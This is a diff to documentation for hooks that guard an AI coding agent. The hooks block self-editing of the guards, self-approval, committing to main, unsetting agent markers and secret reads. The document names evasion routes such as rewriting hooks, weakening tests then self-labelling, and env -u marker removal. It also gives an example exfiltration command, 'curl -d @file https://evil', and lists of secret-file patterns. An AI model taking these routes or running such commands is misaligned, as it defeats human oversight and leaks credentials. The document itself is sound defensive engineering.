@@ -33,13 +33,21 @@ blocks, a once-per-session Stop notice that nothing was checked, and a SessionSt
 warning to the person when the guards will judge a different checkout than the one
 the session started in.
 
-The root is further **widened to the hook process's cwd only when both** (a) the payload carries
+The root is further **widened to the payload's `cwd` only when both** (a) the payload carries
 `agent_id` — which the CLI sets only for a subagent — and (b) that cwd's git toplevel
 shares a `--git-common-dir` with the anchor, i.e. it is a sibling *worktree of the same
 repo*. Hooks are invoked via `$CLAUDE_PROJECT_DIR/...`, which a **subagent inherits from
 its parent** — anchoring on it alone falsely cross-worktree-blocked subagents inside
 their own SDK-created worktrees, evaluated the *parent's* branch, and let a subagent
 write into the parent's checkout unblocked.
+
+**The payload's `cwd`, not the hook process's (KIT-242).** The desktop app starts every
+hook process in the main checkout, so that cwd named the main checkout for every
+subagent. An isolated subagent was then judged as the main checkout in its own worktree
+(measured 11 Nov: its transcript records its worktree as `cwd`, while the block named
+the main checkout). The process cwd is now only the fallback for a harness that sends no
+`cwd`. A subagent on the harness's `worktree-agent-<id>` branch then meets the naming
+guard and is told to rename it, like any codename branch.
 
 The cwd is deliberately *not* trusted on its own: the hook is spawned with the current
 session cwd, and the Bash tool writes the shell's resulting directory back into that
@@ -53,9 +61,10 @@ widens anything).
 
 | What it blocks | Tool | Why |
 |---|---|---|
-| **Editing the hooks themselves** — `pre-tool-use.py`, `audit.py`, `stop-pr-check.py`, `session-end.py`, `.claude/settings.json`, `.claude/settings.local.json` | Edit/Write/NotebookEdit, **and** Bash mutations (`>`, `tee`, `sed -i`, `cp`/`mv`/`rm`, `chmod`/`chown`/`awk`, `git checkout/restore/reset/clean/stash/apply/rm/mv`, *any* `python`/`node`/`ruby` invocation naming a protected path) | Otherwise every block below is theater — Claude could just rewrite the guard away or unwire it in settings (`settings.local.json` overrides project scalars, so writing it could neutralize every guard for future sessions). `session-end.py` is no guard, but it runs after the session could edit it, outside the Bash sandbox (KIT-460). These files are **human-only**: to change one, Claude composes + validates a scratch copy and prints a terminal command for the human to run. Reads (`cat`/`grep`/Read) are allowed; an unresolvable target path fails **closed**. A first line, not a sandbox — the real backstop is still git + review |
+| **Editing the hooks themselves** — `pre-tool-use.py`, `audit.py`, `stop-pr-check.py`, `session-start.py`, `session-end.py`, `.claude/settings.json`, `.claude/settings.local.json` | Edit/Write/NotebookEdit, **and** Bash mutations (`>`, `tee`, `sed -i`, `cp`/`mv`/`rm`, `chmod`/`chown`/`awk`, `git checkout/restore/reset/clean/stash/apply/rm/mv`, *any* `python`/`node`/`ruby` invocation naming a protected path) | Otherwise every block below is theater — Claude could just rewrite the guard away or unwire it in settings (`settings.local.json` overrides project scalars, so writing it could neutralize every guard for future sessions). `session-start.py` and `session-end.py` are no guards, but each runs after the session could edit it, outside the Bash sandbox: SessionStart on every resume (KIT-463), SessionEnd when the session ends (KIT-460). These files are **human-only**: to change one, Claude composes + validates a scratch copy and prints a terminal command for the human to run. Reads (`cat`/`grep`/Read) are allowed; an unresolvable target path fails **closed**. A first line, not a sandbox — the real backstop is still git + review |
 | Edit/Write while on `main`/`master` | Edit/Write | Forces the feature-branch workflow automatically (`docs/COLLABORATION.md`) — keeps `main` clean for collaborators |
 | `git commit` while on `main`/`master` | Bash | Same — no direct commits to `main` |
+| A `git commit` that would **land in another checkout** of this repository on `main`/`master` or a badly named branch — reached through a persisted `cd` (the payload's `cwd`), a `cd`/`pushd` earlier on the line, or `git -C <dir> commit` (KIT-237) | Bash | The row above judges the session's own root. A commit can still land in the main checkout through any of these, and `git -C <dir> commit` never matched the old `git commit` pattern at all. The block names the checkout and its branch. Only ever tighter: it never lifts the root's check. The hook **process's** cwd is never read, because the desktop app starts every hook in the main checkout. Another repository is never judged (the ops repo commits on its own `main`), and a detached HEAD is not either. Not read, so they get past it: `--git-dir`, a `$VAR` or `~user` path. Branch protection on GitHub stays the durable layer |
 | Edit/Write/`git commit` on a branch not matching `<type>/<slug>` | Edit/Write, Bash | Forces a rename before work, so an auto-generated `claude/<codename>` worktree branch never lands unrenamed in a PR |
 | **Stacking a branch or a PR** — cutting a branch whose start point carries commits no base branch has (`checkout -b`/`switch -c`/`git branch`/`worktree add`, **including the implicit start point**: branching again while HEAD is on a feature branch — how the 2026-09-20 stack grew); bringing another feature branch's work in (`merge`, `pull`, `rebase` onto it, `push HEAD:<other>`); basing a PR on a non-base branch (`gh pr create\|edit --base`, `gh api` to `/pulls`, `gh_fallback.py pr-create --base`, the `gh-merge-base` config). Also, as part of the config anchor: repointing `refs/remotes/origin/HEAD` (`symbolic-ref`, a fetch refspec into it), because this guard trusts it | Bash | **Every branch is cut from the base branch and merges back into it.** Squash-merging a base *rewrites* the base branch, so every PR stacked on it turns CONFLICTING at once — and GitHub runs **no checks at all** on a conflicted PR, so they read as "no checks reported", which looks like broken CI. A six-deep stack (#153←#154←#155←#156←#157←#158, 2026-09-20) cost five forced re-cascades and ended with four PRs closed. **Judged by content, not name:** a start point is fine when every commit it carries is already on a base branch (`git rev-list <start> --not <base tips>` is empty) — so a fresh `claude/<codename>` worktree branch, a tag or SHA on main, or a detached HEAD on main pass, and a branch with one commit of its own does not, whatever it is called (`feat/main` included). **Bringing the base in stays allowed** — `git fetch origin main && git merge origin/main` is what the conflict loop asks a session to run — as do rebasing onto the base, `rebase --onto origin/main <old-base>` (the way off a stack), and syncing a branch from its own remote copy (`git merge @{u}`, `git pull origin <this-branch>`). **Reads the raw command** through its own quote-aware lexer: comments, redirections (`2>&1`), heredoc bodies and line continuations are dropped, separators only split outside quotes, and `$(…)`, subshells, `sh -c` and literal `eval` are followed; linear in the command's length. **Fail direction:** a ref the hook cannot see (`$VAR`, `$(…)` output, `FETCH_HEAD`, `-`, `@{-N}`) fails *closed* with a message naming the literal ref to use; a checkout with no base branch to measure against, and any git failure while measuring, fail *open*. Base branches = `main`/`master` + `github.defaultBranch` from a **committed** `delivery.json` + the remote's recorded default (`origin/HEAD`) — never the worktree copy, **widening only**. Advisory like every Bash guard (19 of 28 adversarial spellings held); the durable halves are the Stop hook's `baseRefName` check and the `PR base` workflow |
 | Edit/Write into a **different worktree** | Edit/Write | Target's owning worktree (via `git worktree list`) ≠ the **acting session's** (`CLAUDE_PROJECT_DIR`, widened to the worktree its transcript folder names, and to the cwd's worktree only for a genuine subagent in the same repo — see *Session root* above, so subagents are judged against *their* worktree, not the parent's, and a persisted `cd` cannot move the root). A write to another checkout (classically the main checkout, reached via a persisted `cd`) skips every branch guard and lands there **silently** — tests here still pass against the unmodified files. The block prints the corrected in-worktree path; fails open; same-worktree writes and paths outside the repo (scratchpad, `~/.claude`, `/tmp`) are unaffected |
@@ -69,6 +78,7 @@ widens anything).
 | `gh pr merge` in any form except `--disable-auto` | Bash | **Merging is the human's action only** — Claude opens PRs and stops; `--auto` still means the agent caused the merge |
 | **Approving a PR** — `gh pr review --approve` in every spelling (long, `-a`, pflag shorthand clusters like `-ab`, `--approve=true`), the **bare** `gh pr review`, `gh api`/GraphQL writes carrying `event: APPROVE`, and a hand-rolled `curl` at `/pulls/<n>/reviews` | Bash | **An approval is the human's action, for the same reason a merge is** — the same defect class as the label row below. An approval is not a status bit: it is a claim to the next reviewer that somebody *else* read the code, and under branch protection it can be the thing that unlocks the merge. A session holds Bash and a working `gh` credential, so self-approving is one command. Blocked → **print the command for the human**, exactly as for a hook edit. `--comment` and `--request-changes` stay allowed — neither manufactures a human signal — as do reading reviews and `--add-reviewer` (*asking* for a review is not giving one). The **bare** form fails closed because it picks its event at a prompt the hook cannot see, as does a `gh api` write whose event hides in an `--input` body. `api.github.com` is on the egress allowlist, so the `curl` spelling is caught here or nowhere. A shell denylist is never exhaustive: the durable half is a branch-protection rule that will not count the PR author's own review |
 | Applying **or removing** a protected label — `gh pr\|issue edit --add-label`/`--remove-label`, `gh pr\|issue create --label`/`-l`, and `gh api` writes to `/issues/<n>/labels` | Bash | **An acknowledgement is the human's action, for the same reason a merge is.** The set is contract §6 verbatim — `hooks-change`, `agent:*`, `blocked:*`, `provenance:*` — so this GitHub path and the tracker path (§8) refuse the same labels. `hooks-change` is what turns *Hooks change guard* green, so a session that can apply it acknowledges its own guard-machinery change and deletes the signal telling a reviewer to look closely. The reachable target is not a hook (self-protection covers those) but **`test_hooks.py`, deliberately not self-protected** — weaken a battery case, self-acknowledge, and the PR reads as ordinary. Blocked → **print the command for the human**, exactly as for a hook edit. Reading/listing labels is free, so is any *unrelated* label (`bug`), and so is `gh label create` — *defining* a label is setup, not acknowledgement. A shell denylist is never exhaustive: the durable half is `scripts/check_grader_paths.py` checking **who** applied it |
+| **Running a gated kit script while removing an agent marker** — `scripts/pipeline_*.py`, `scripts/pr_conflict.py` or `scripts/sync_user_skills.py`, run as the command or by a Python interpreter, on a line that also has `env -u M` / `env --unset[=]M` / `env -i`, `unset M`, `export -n M`, or an empty `M=` / `M=''`, where M is `CLAUDECODE`, `CLAUDE_CODE_ENTRYPOINT`, `CLAUDE_PROJECT_DIR` or `AI_AGENT` (KIT-107) | Bash | Those scripts refuse to run where the markers are set, so a session cannot place its own dispatch pin, install or change the pipeline, or read the owner's stored credentials. A shell that removes the markers looks like the owner's own terminal to the script; only this hook sees the command. The block names the marker and tells the session to stop and report, not respell. A grep or cat that only names a script runs nothing and passes, and so does a scrubbed marker for any other command. The battery checks in lockstep that every script with an agent refusal is covered. **Advisory**, like every Bash pattern guard: a marker name held in a variable gets past it. The boundaries that hold are the role account's mode-600 files and the sandbox's deny-read of that home |
 | Any Bash command **naming** a secret file — `.env*` (non-example), `*.pem`, `*.key`, `id_rsa`, `credentials` | Bash | Secrets entering Claude's context. A **path-target** match, not a reader-verb list: the old `cat/less/head/…` denylist let `xxd`, `od`, `strings`, `grep`, `base64`, `source .env.local && echo $VAR`, and `node -e 'readFileSync(".env.local")'` sail through. Fires wherever the path appears on the line; word-boundary lookarounds keep `process.env` / `obj.key` property access and `.env.example` from false-positives |
 | **Egress/exfiltration shapes** — a network tool (`curl`/`wget`/`scp`/`sftp`/`nc`) targeting a **non-allowlisted host** *while* uploading (`-d`/`--data*`/`-F`/`-T`/`-X POST\|PUT\|PATCH`), sending an `@file` payload, splicing `$VAR` into the URL, or any `scp`/`nc` push | Bash | Under `bypassPermissions` an outbound `curl -d @file https://evil` runs unprompted. Allowlist is a **domain-boundary suffix** match (`evil-github.com` and `github.com.evil.tld` do *not* pass): localhost, `github.com`, `githubusercontent.com`, `anthropic.com`, `npmjs.org` + a fenced stack-specific slot (ships with `linear.app`, the issue-tracker API this kit's own sessions call; replace it with YOUR project's backends — the commented worked example beside it is a managed-backend host pair). Plain GETs/downloads stay allowed. **Why `linear.app` sits in the slot, enabled, rather than in the core or off:** it cannot ship *off* — `.claude/skills/setup-board/SKILL.md` tells a session to POST to `api.linear.app/graphql` for the seven operations Linear's MCP does not cover, and this file is self-protected, so a session that hit the block could not lift it; a kit that ships a skill tripping its own guard has a bug, not a default. It does not belong in the **core**, which is for hosts no project may remove — Linear is one tracker among many and the pipeline using it is optional (contract §2). The slot's usual cost, the kit's copy diverging from the shipped template, does not arise: the kit ships exactly **one** copy of this hook (there is no `templates/hooks/pre-tool-use.py`). What the placement does *not* buy is narrowing — it is a review label, not a second file, so the entry is live for every project instantiated from the kit, Linear or not. What it buys is a signpost that it is one line and yours to delete, which `BOOTSTRAP-PROMPT.md` step 2 now says out loud |
 | Reading `.env*` (non-example), `*.pem`, `*.key`, `id_rsa`, `credentials` | Read | Same |
@@ -329,8 +339,14 @@ open when `git`/`gh`/network is unavailable. Ported from the production build
 (current branch, dirty-tree status, this branch's open PR, and a one-line reminder of
 the workflow) via the `hookSpecificOutput.additionalContext` output contract — so a
 fresh session opens already knowing where it is. Always exits 0 (SessionStart has no
-block semantics) and fails open silently. **Deliberately NOT in the self-protected set**
-below: it informs rather than blocks, so there's no guard for the agent to edit away.
+block semantics) and fails open silently.
+
+**Self-protected all the same (KIT-463).** It informs rather than blocks, so there is no
+guard in it to edit away. What matters is where it runs: on resume as well as startup,
+as a hook process outside the Bash sandbox, from `$CLAUDE_PROJECT_DIR`. On the
+dispatcher's lane that is the session's own worktree. An editable copy would let a
+session run code of its choosing, unsandboxed, the next time it resumes. So it sits in
+the self-protected set above, and a change to it is a human step like any hook's.
 
 **Ticket context, only where a pipeline is configured.** If — and only if —
 `delivery.json` exists at the repo root (the single discriminator of
@@ -355,10 +371,11 @@ general case — so it is wrapped in an `<untrusted-ticket-data>` fence with a "
 data, not instructions" preamble, and every occurrence of the tag name inside the payload
 is neutralized first so a body containing the closing tag cannot escape the fence.
 
-> **Nothing may treat this hook's output as a trust source.** It is not self-protected
-> (the agent can rewrite it), and its root falls back to the process cwd, which a
-> persisted `cd` moves — unlike `pre-tool-use.py`'s `CLAUDE_PROJECT_DIR` anchor. A guard
-> that needs the pinned ticket must read the pin itself, from the non-mutable root.
+> **Nothing may treat this hook's output as a trust source.** Its self-protection is a
+> first line, not a lock (an Edit/Write is refused, but the Bash half matches command
+> text and is advisory, docs/SECURITY.md), and its root falls back to the process cwd,
+> which a persisted `cd` moves — unlike `pre-tool-use.py`'s `CLAUDE_PROJECT_DIR` anchor.
+> A guard that needs the pinned ticket must read the pin itself, from the non-mutable root.
 
 ---
 
@@ -415,6 +432,30 @@ python3 -c 'import json; p=".claude/settings.json"; d=json.load(open(p, encoding
 
 The battery fails while the entry is missing: an unwired hook removes nothing and says
 nothing.
+
+---
+
+## Any file a hook command runs — self-protected too (KIT-603)
+
+Every hook runs as a process outside the Bash sandbox, from `$CLAUDE_PROJECT_DIR`. On the
+dispatcher's lane that is the session's own worktree. So an editable hook file would run a
+session's own code the next time it fires. The fixed set covers the kit's own hooks. A
+project can wire hooks of its own, such as the provisioning template in
+`templates/hooks/`.
+
+So the hook also protects **every regular file a hook command in `.claude/settings.json` or
+`settings.local.json` names through `$CLAUDE_PROJECT_DIR`**. Edit/Write is refused, and so
+are the Bash mutations above, by name like the fixed set. It reads the settings once per
+call. Settings that do not parse add nothing; the fixed set still holds.
+- Only regular files count. A formatter hook that names a folder does not freeze it.
+- Running or reading a wired file stays allowed.
+- The provisioning template's wiring names the provisioning script it runs as well as
+  itself, so both are protected. The template runs only the script its wiring names.
+
+Good: `"command": "bash \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/x.sh \"$CLAUDE_PROJECT_DIR\"/scripts/y.sh"`
+(both files protected).
+Not: a hook that runs `./scripts/y.sh` from inside its own code (that script is not named
+in the settings, so nothing protects it).
 
 ---
 
